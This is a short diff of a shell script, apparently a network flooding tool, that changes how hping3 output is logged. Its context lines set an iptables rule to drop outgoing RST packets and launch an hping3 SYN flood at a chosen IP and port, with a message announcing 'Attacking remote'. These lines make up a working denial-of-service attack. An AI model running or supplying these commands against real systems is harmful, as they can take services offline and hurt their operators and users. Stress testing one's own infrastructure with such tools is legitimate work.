@@ -71,4 +71,4 @@ iptables -I OUTPUT 1 -d $ip_destination -p tcp --tcp-flags RST RST -j DROP
 
 echo "Attacking remote $ip_destination and port $port"
 
-hping3 $count -M 0 -i u5  $flood -S "$ip_destination" -p "$port" > /var/log/hping3.log 2>&1
+hping3 $count -M 0 -i u5  $flood -S "$ip_destination" -p "$port" >> /var/log/hping3.log 2>&1
